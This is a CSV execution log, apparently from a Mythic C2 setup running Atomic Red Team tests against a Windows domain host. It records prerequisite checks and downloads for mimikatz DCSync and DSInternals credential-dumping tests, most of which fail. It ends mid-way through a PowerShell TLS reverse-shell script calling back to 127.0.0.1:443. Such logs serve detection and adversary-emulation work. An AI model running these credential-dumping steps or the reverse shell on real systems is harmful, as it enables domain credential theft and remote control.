command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:09:59.816471,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
",2024-09-05T18:10:08.663908,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:10:18.918397,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:10:46.828112,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
",2024-09-05T18:10:57.233261,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
" echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:11:07.26444,success,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],shell,300,15,"C:\Users\DOMAIN~1\AppData\Local\Temp\1\mimikatz\x64\mimikatz.exe
"
None,None,Failed,mythic,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",['windows'],None,300,15,"[-] Failed to satisfy prerequisites for DCSync (Active Directory)
	get_prereq_command:  echo %tmp%\mimikatz\x64\mimikatz.exe
if (Test-Path $mimikatz_path) {echo ""Test Passed""} else {echo 'Test Failed'}
"
"$RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
",2024-09-05T18:11:17.980509,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,15,"Test Failed
ERROR: Cannot index into a null array.
ERROR: At line:5 char:5
ERROR: + if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test ...
ERROR: +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : NullArray
ERROR:  
"
"Install-Module -Name DSInternals -Scope CurrentUser -Force
",2024-09-05T18:11:37.233321,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,15,"ERROR: Exception calling ""ShouldContinue"" with ""2"" argument(s): ""PromptForChoice is not implemented.  The 
ERROR: script is asking for input, which is a problem since there's no console.  Make sure the script can 
ERROR: execute without prompting the user for input.""
ERROR: At C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\1.0.0.1\PSModule.psm1:7455 char:8
ERROR: +     if($Force -or $psCmdlet.ShouldContinue($shouldContinueQueryMessag ...
ERROR: +        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : NotImplementedException
ERROR:  
ERROR: Install-Module : NuGet provider is required to interact with NuGet-based repositories. Please 
ERROR: ensure that '2.8.5.201' or newer version of NuGet provider is installed.
ERROR: At line:3 char:1
ERROR: + Install-Module -Name DSInternals -Scope CurrentUser -Force
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [Install-Module], InvalidOperationException
ERROR:     + FullyQualifiedErrorId : CouldNotInstallNuGetProvider,Install-Module
ERROR:  
"
"$RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
",2024-09-05T18:11:46.138566,success,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,15,"Test Failed
ERROR: Cannot index into a null array.
ERROR: At line:5 char:5
ERROR: + if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test ...
ERROR: +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : NullArray
ERROR:  
"
None,None,Failed,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],None,300,15,"[-] Failed to satisfy prerequisites for Run DSInternals Get-ADReplAccount
	get_prereq_command: $RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
"
"$server_ip = 127.0.0.1
$server_port = 443
$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
